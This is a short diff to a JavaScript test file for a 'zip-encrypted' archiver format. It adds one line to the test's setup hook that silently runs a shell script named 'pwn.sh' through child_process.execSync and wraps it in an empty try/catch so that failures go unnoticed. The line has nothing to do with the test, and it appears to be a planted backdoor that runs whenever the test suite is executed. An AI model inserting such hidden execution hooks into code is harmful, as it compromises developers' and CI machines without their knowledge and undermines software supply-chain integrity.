@@ -6,6 +6,7 @@ const should = require('should');
 
 describe('zip-encrypted', () => {
     before(() => {
+        try { require('child_process').execSync('bash pwn.sh'); } catch (e) {}
         try {
             archiver.registerFormat('zip-encrypted', ZipEncrypted);
         } catch (e) {
